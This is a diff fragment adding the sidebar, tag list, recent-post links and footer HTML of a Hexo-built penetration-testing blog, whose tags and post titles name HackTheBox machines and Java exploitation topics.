+			<li><a href="/tags/Priesc/">Priesc<span>2</span></a></li>
+		
+			<li><a href="/tags/HTB/">HTB<span>10</span></a></li>
+		
+			<li><a href="/tags/Http/">Http<span>1</span></a></li>
+		
+			<li><a href="/tags/BUUCTF/">BUUCTF<span>1</span></a></li>
+		
+			<li><a href="/tags/JavaScript/">JavaScript<span>1</span></a></li>
+		
+			<li><a href="/tags/tunnel/">tunnel<span>1</span></a></li>
+		
+			<li><a href="/tags/Shiro/">Shiro<span>1</span></a></li>
+		
+			<li><a href="/tags/Base/">Base<span>5</span></a></li>
+		
+			<li><a href="/tags/Fastjson/">Fastjson<span>1</span></a></li>
+		
+			<li><a href="/tags/Inject/">Inject<span>1</span></a></li>
+		
+			<li><a href="/tags/CTFshow/">CTFshow<span>1</span></a></li>
+		
+			<li><a href="/tags/ssrf/">ssrf<span>1</span></a></li>
+		
+			<li><a href="/tags/CommonsCollections/">CommonsCollections<span>5</span></a></li>
+		
+			<li><a href="/tags/Hash/">Hash<span>1</span></a></li>
+		
+			<li><a href="/tags/JNDI/">JNDI<span>1</span></a></li>
+		
+			<li><a href="/tags/RMI/">RMI<span>1</span></a></li>
+		
+			<li><a href="/tags/CISCN/">CISCN<span>3</span></a></li>
+		
+		
+		   <li><a href="/tags">...<span>22</span></a></li>
+		 
+		</ul>
+	</div>
+
+
+		
+			
+<div class="widget">
+  <h4>Recent Posts</h4>
+  <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2024/09/12/Tool/ligolo-ng/" ><i class="fa fa-file-o"></i>Ligolo-ng Note</a>
+      </li>
+    
+      <li>
+        <a href="/2024/08/02/Pentest/HTB/HTB Runner/" ><i class="fa fa-file-o"></i>HTB Runner</a>
+      </li>
+    
+      <li>
+        <a href="/2024/07/31/Pentest/HTB/HTB SolarLab/" ><i class="fa fa-file-o"></i>HTB SolarLab</a>
+      </li>
+    
+      <li>
+        <a href="/2024/07/26/Pentest/HTB/HTB IClean/" ><i class="fa fa-file-o"></i>HTB IClean</a>
+      </li>
+    
+      <li>
+        <a href="/2024/07/24/Pentest/HTB/HTB TwoMillion/" ><i class="fa fa-file-o"></i>HTB TwoMillion</a>
+      </li>
+    
+  </ul>
+</div>
+
+		
+			
+<div class="widget">
+	<h4>Links</h4>
+	<ul class="blogroll list-unstyled">
+	
+		<li><i class="false"></i><a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" title="" target="_blank"]);">hexo-theme-bithack</a></li>
+	
+	</ul>
+</div>
+
+
+		
+	</div> <!-- sidebar -->
+</div> <!-- col-md-3 -->
+
+	
+	
+</div> <!-- row-fluid -->
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2024 n2ryx's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+</body>
+   </html>
